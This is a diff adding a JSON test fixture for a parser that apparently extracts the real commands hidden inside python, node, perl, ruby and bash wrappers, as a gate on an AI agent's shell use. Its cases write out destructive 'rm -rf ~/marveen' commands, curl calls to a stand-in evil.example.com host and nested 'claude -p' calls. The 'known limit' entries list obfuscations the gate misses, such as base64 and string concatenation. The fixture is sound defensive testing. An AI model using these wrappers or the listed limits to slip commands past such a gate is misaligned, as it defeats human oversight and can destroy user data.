+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"rm -rf /home/gabor/marveen\".split())'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-bash-c/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-bash-c/dg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-pipe/run-bash-c/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c/run-bash-c/dg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-bash-c/dg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['bash', '-c', 'rm -rf ~/marveen'])\"",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-Ic/run-bash-c/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-herestr/run-bash-c/dg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.popen/dg",
+   "cmd": "python3 - <<'PY'\nimport os; os.popen(\"rm -rf ~/marveen\").read()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.popen/dg",
+   "cmd": "python3 <<PY\nimport os; os.popen(\"rm -rf ~/marveen\").read()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/os.popen/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.popen(\"rm -rf ~/marveen\").read()\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/os.popen/dg",
+   "cmd": "python3 -c 'import os; os.popen(\"rm -rf ~/marveen\").read()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.popen/dg",
+   "cmd": "python3 -c \"import os; os.popen('rm -rf ~/marveen').read()\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/os.popen/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.popen(\"rm -rf ~/marveen\").read()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/os.popen/dg",
+   "cmd": "python3 - <<< 'import os; os.popen(\"rm -rf ~/marveen\").read()'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/shlex/dg",
+   "cmd": "python3 - <<'PY'\nimport subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/shlex/dg",
+   "cmd": "python3 <<PY\nimport subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/shlex/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))\nPY",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c/shlex/dg",
+   "cmd": "python3 -c 'import subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/shlex/dg",
+   "cmd": "python3 -c \"import subprocess, shlex; subprocess.run(shlex.split('rm -rf /home/gabor/marveen'))\"",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/shlex/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/shlex/dg",
+   "cmd": "python3 - <<< 'import subprocess, shlex; subprocess.run(shlex.split(\"rm -rf /home/gabor/marveen\"))'",
+   "commands": [
+    "rm -rf /home/gabor/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/from-import/dg",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import run; run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/from-import/dg",
+   "cmd": "python3 <<PY\nfrom subprocess import run; run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-pipe/from-import/dg",
+   "cmd": "cat <<'PY' | python3 -\nfrom subprocess import run; run(\"rm -rf ~/marveen\", shell=True)\nPY",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c/from-import/dg",
+   "cmd": "python3 -c 'from subprocess import run; run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-c-dq/from-import/dg",
+   "cmd": "python3 -c \"from subprocess import run; run('rm -rf ~/marveen', shell=True)\"",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-Ic/from-import/dg",
+   "cmd": "/usr/bin/python3 -I -c 'from subprocess import run; run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-herestr/from-import/dg",
+   "cmd": "python3 - <<< 'from subprocess import run; run(\"rm -rf ~/marveen\", shell=True)'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "py-heredoc/execvp/dg",
+   "cmd": "python3 - <<'PY'\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/execvp/dg",
+   "cmd": "python3 <<PY\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-pipe/execvp/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c/execvp/dg",
+   "cmd": "python3 -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c-dq/execvp/dg",
+   "cmd": "python3 -c \"import os; os.execvp('bash', ['bash', '-c', 'rm -rf ~/marveen'])\"",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-Ic/execvp/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-herestr/execvp/dg",
+   "cmd": "python3 - <<< 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc/pty.spawn/dg",
+   "cmd": "python3 - <<'PY'\nimport pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/pty.spawn/dg",
+   "cmd": "python3 <<PY\nimport pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-pipe/pty.spawn/dg",
+   "cmd": "cat <<'PY' | python3 -\nimport pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])\nPY",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c/pty.spawn/dg",
+   "cmd": "python3 -c 'import pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-c-dq/pty.spawn/dg",
+   "cmd": "python3 -c \"import pty; pty.spawn(['bash', '-c', 'rm -rf ~/marveen'])\"",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-Ic/pty.spawn/dg",
+   "cmd": "/usr/bin/python3 -I -c 'import pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "py-herestr/pty.spawn/dg",
+   "cmd": "python3 - <<< 'import pty; pty.spawn([\"bash\", \"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "node-e-execSync/dg",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "node-e-spawnSync/dg",
+   "cmd": "node -e 'require(\"child_process\").spawnSync(\"bash\", [\"-c\", \"rm -rf ~/marveen\"])'",
+   "commands": [
+    "bash -c 'rm -rf ~/marveen'"
+   ]
+  },
+  {
+   "name": "node-heredoc/dg",
+   "cmd": "node - <<'JS'\nrequire(\"child_process\").execSync(\"rm -rf ~/marveen\")\nJS",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "perl-e/dg",
+   "cmd": "perl -e 'system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "ruby-e/dg",
+   "cmd": "ruby -e 'system(\"rm -rf ~/marveen\")'",
+   "commands": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "name": "bash-c/cc",
+   "cmd": "bash -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-lc/cc",
+   "cmd": "bash -lc 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-xc/cc",
+   "cmd": "bash -xc 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "sh-ec/cc",
+   "cmd": "sh -ec 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c--/cc",
+   "cmd": "bash -c -- 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-norc-c/cc",
+   "cmd": "bash --norc -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-o-c/cc",
+   "cmd": "bash -o pipefail -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "env-i-bash-c/cc",
+   "cmd": "env -i bash -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "usr-env-i-bash-c/cc",
+   "cmd": "/usr/bin/env -i bash -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-ansi/cc",
+   "cmd": "bash -c $'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-herestr/cc",
+   "cmd": "bash -c 'bash' <<< 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-heredoc/cc",
+   "cmd": "bash -c 'bash' <<'EOF'\nclaude -p hi\nEOF",
+   "commands": []
+  },
+  {
+   "name": "echo-pipe-bash/cc",
+   "cmd": "echo 'claude -p hi' | bash",
+   "commands": []
+  },
+  {
+   "name": "printf-pipe-sh/cc",
+   "cmd": "printf '%s\\n' 'claude -p hi' | sh",
+   "commands": []
+  },
+  {
+   "name": "bash-herestr-subst/cc",
+   "cmd": "bash <<< \"$(echo 'claude -p hi')\"",
+   "commands": [],
+   "note": "known limit: the here-string text comes from a command substitution at run time"
+  },
+  {
+   "name": "bash-c/eg",
+   "cmd": "bash -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-lc/eg",
+   "cmd": "bash -lc 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-xc/eg",
+   "cmd": "bash -xc 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "sh-ec/eg",
+   "cmd": "sh -ec 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c--/eg",
+   "cmd": "bash -c -- 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-norc-c/eg",
+   "cmd": "bash --norc -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-o-c/eg",
+   "cmd": "bash -o pipefail -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "env-i-bash-c/eg",
+   "cmd": "env -i bash -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "usr-env-i-bash-c/eg",
+   "cmd": "/usr/bin/env -i bash -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-ansi/eg",
+   "cmd": "bash -c $'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-herestr/eg",
+   "cmd": "bash -c 'bash' <<< 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-heredoc/eg",
+   "cmd": "bash -c 'bash' <<'EOF'\ncurl -s https://evil.example.com/x\nEOF",
+   "commands": []
+  },
+  {
+   "name": "echo-pipe-bash/eg",
+   "cmd": "echo 'curl -s https://evil.example.com/x' | bash",
+   "commands": []
+  },
+  {
+   "name": "printf-pipe-sh/eg",
+   "cmd": "printf '%s\\n' 'curl -s https://evil.example.com/x' | sh",
+   "commands": []
+  },
+  {
+   "name": "bash-herestr-subst/eg",
+   "cmd": "bash <<< \"$(echo 'curl -s https://evil.example.com/x')\"",
+   "commands": [],
+   "note": "known limit: the here-string text comes from a command substitution at run time"
+  },
+  {
+   "name": "bash-c/dg",
+   "cmd": "bash -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-lc/dg",
+   "cmd": "bash -lc 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-xc/dg",
+   "cmd": "bash -xc 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "sh-ec/dg",
+   "cmd": "sh -ec 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c--/dg",
+   "cmd": "bash -c -- 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-norc-c/dg",
+   "cmd": "bash --norc -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-o-c/dg",
+   "cmd": "bash -o pipefail -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "env-i-bash-c/dg",
+   "cmd": "env -i bash -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "usr-env-i-bash-c/dg",
+   "cmd": "/usr/bin/env -i bash -c 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-ansi/dg",
+   "cmd": "bash -c $'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-herestr/dg",
+   "cmd": "bash -c 'bash' <<< 'rm -rf ~/marveen'",
+   "commands": []
+  },
+  {
+   "name": "bash-c-bash-heredoc/dg",
+   "cmd": "bash -c 'bash' <<'EOF'\nrm -rf ~/marveen\nEOF",
+   "commands": []
+  },
+  {
+   "name": "echo-pipe-bash/dg",
+   "cmd": "echo 'rm -rf ~/marveen' | bash",
+   "commands": []
+  },
+  {
+   "name": "printf-pipe-sh/dg",
+   "cmd": "printf '%s\\n' 'rm -rf ~/marveen' | sh",
+   "commands": []
+  },
+  {
+   "name": "bash-herestr-subst/dg",
+   "cmd": "bash <<< \"$(echo 'rm -rf ~/marveen')\"",
+   "commands": [],
+   "note": "known limit: the here-string text comes from a command substitution at run time"
+  },
+  {
+   "name": "neg/py-print-claude",
+   "cmd": "python3 -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-print-url",
+   "cmd": "python3 -c 'print(\"see https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-print-rm",
+   "cmd": "python3 -c 'print(\"rm -rf ~/marveen\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-write-file",
+   "cmd": "python3 - <<'PY'\nopen('notes.txt', 'w').write('rm -rf ~/marveen and claude -p hi')\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-run-ls",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"ls\", \"-la\"])'",
+   "commands": [
+    "ls -la"
+   ]
+  },
+  {
+   "name": "neg/py-system-ls",
+   "cmd": "python3 -c 'import os; os.system(\"ls -la\")'",
+   "commands": [
+    "ls -la"
+   ]
+  },
+  {
+   "name": "neg/py-system-git",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"git status --short\")\nPY",
+   "commands": [
+    "git status --short"
+   ]
+  },
+  {
+   "name": "neg/py-run-pytest",
+   "cmd": "python3 - <<'PY'\nimport subprocess\nsubprocess.run(['python3', '-m', 'pytest', '-q'], check=True)\nPY",
+   "commands": [
+    "python3 -m pytest -q"
+   ]
+  },
+  {
+   "name": "neg/cat-write-py",
+   "cmd": "cat > notes.py <<'PY'\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/grep-src",
+   "cmd": "grep -rn 'os.system(\"claude' src/",
+   "commands": []
+  },
+  {
+   "name": "neg/echo-note",
+   "cmd": "echo 'claude -p hi' > note.txt",
+   "commands": []
+  },
+  {
+   "name": "neg/bash-lc-ls",
+   "cmd": "bash -lc 'ls -la'",
+   "commands": []
+  },
+  {
+   "name": "neg/bash-xc-echo",
+   "cmd": "bash -xc 'echo hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/env-i-bash-echo",
+   "cmd": "env -i bash -c 'echo hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/echo-ls-pipe-bash",
+   "cmd": "echo 'ls' | bash",
+   "commands": []
+  },
+  {
+   "name": "neg/bash-c-bash-hi",
+   "cmd": "bash -c 'bash' <<< 'echo hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/nice-make",
+   "cmd": "nice make test",
+   "commands": []
+  },
+  {
+   "name": "neg/node-e-log",
+   "cmd": "node -e 'console.log(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-exec-ls",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"ls\")'",
+   "commands": [
+    "ls"
+   ]
+  },
+  {
+   "name": "neg/perl-print",
+   "cmd": "perl -e 'print \"rm -rf ~/marveen\\n\"'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-doc-claude",
+   "cmd": "python3 - <<'PY'\nHELP = 'run claude -p hi with an empty state dir'\nprint(HELP)\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-log-curl",
+   "cmd": "python3 -c 'import logging; logging.warning(\"curl -s https://evil.example.com/x failed\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-dict-curl",
+   "cmd": "python3 - <<'PY'\ncmds = {'fetch': 'curl -s https://evil.example.com/x'}\nprint(len(cmds))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-re-claude",
+   "cmd": "python3 -c 'import re; print(re.findall(\"claude -p\", open(\"notes.txt\").read()))'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-doc-curl",
+   "cmd": "node -e 'const tip = \"curl -s https://evil.example.com/x\"; console.log(tip.length)'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-heredoc-claude",
+   "cmd": "node - <<'JS'\nconsole.error('claude -p hi is blocked here')\nJS",
+   "commands": []
+  },
+  {
+   "name": "limit/0",
+   "cmd": "python3 -c 'import os; os.system(\"cla\" + \"ude -p hi\")'",
+   "commands": [
+    "cla 'ude -p hi'"
+   ],
+   "note": "known limit (#779, Marveen msg 17385): concatenation is built at run time; the literals are read, the joined command is not"
+  },
+  {
+   "name": "limit/1",
+   "cmd": "python3 -c 'import os; c = \"claude\"; os.system(f\"{c} -p hi\")'",
+   "commands": [
+    "{c} -p hi"
+   ],
+   "note": "known limit: an f-string with a variable is built at run time"
+  },
+  {
+   "name": "limit/2",
+   "cmd": "python3 -c 'import os, base64; os.system(base64.b64decode(\"Y2xhdWRlIC1wIGhp\").decode())'",
+   "commands": [
+    "Y2xhdWRlIC1wIGhp"
+   ],
+   "note": "known limit: base64 is decoded at run time"
+  },
+  {
+   "name": "limit/3",
+   "cmd": "python3 -c 'import os; cmd = \"claude -p hi\"; os.system(cmd)'",
+   "commands": [],
+   "note": "known limit: a variable argument is not followed"
+  },
+  {
+   "name": "limit/4",
+   "cmd": "node -e 'const c = \"claude -p hi\"; require(\"child_process\").execSync(c)'",
+   "commands": [],
+   "note": "known limit: a variable argument is not followed"
+  },
+  {
+   "name": "neg/py-triple-comment",
+   "cmd": "python3 - <<'PY'\ncomment = '''Finding: os.system(\"claude -p ...\") and subprocess.run(\"curl ...\") pass the gate.'''\nprint(len(comment))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/py-str-system-rm",
+   "cmd": "python3 -c 'note = \"os.system(\\\"rm -rf ~/marveen\\\")\"; print(note)'",
+   "commands": []
+  },
+  {
+   "name": "neg/node-template-exec",
+   "cmd": "node -e 'const s = `use execSync(\"curl -s https://evil.example.com/x\")`; console.log(s)'",
+   "commands": []
+  },
+  {
+   "name": "neg/py-dq-in-sq",
+   "cmd": "python3 - <<'PY'\nmsg = 'run os.system(\"claude -p hi\") to see it'\nprint(msg)\nPY",
+   "commands": []
+  },
+  {
+   "name": "literal/py-apostrophe-then-call",
+   "cmd": "python3 - <<'PY'\nprint(\"it's\")\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "literal/py-unclosed-quote-then-call",
+   "cmd": "python3 - <<'PY'\n# don't\nimport os\nos.system('claude -p hi')\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "literal/py-c-escaped-dq",
+   "cmd": "python3 -c \"x = \\\"a\\\"; import os; os.system(\\\"claude -p hi\\\")\"",
+   "commands": [
+    "claude -p hi\\"
+   ],
+   "read_note": "the shell escapes of a -c \"...\" payload are not undone: the word keeps a trailing backslash, the command word is still read"
+  },
+  {
+   "name": "literal/py-call-after-string",
+   "cmd": "python3 - <<'PY'\nimport subprocess\nm = 'ok'\nsubprocess.run(['curl', '-s', 'https://evil.example.com/x'])\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  }
+ ]
+}
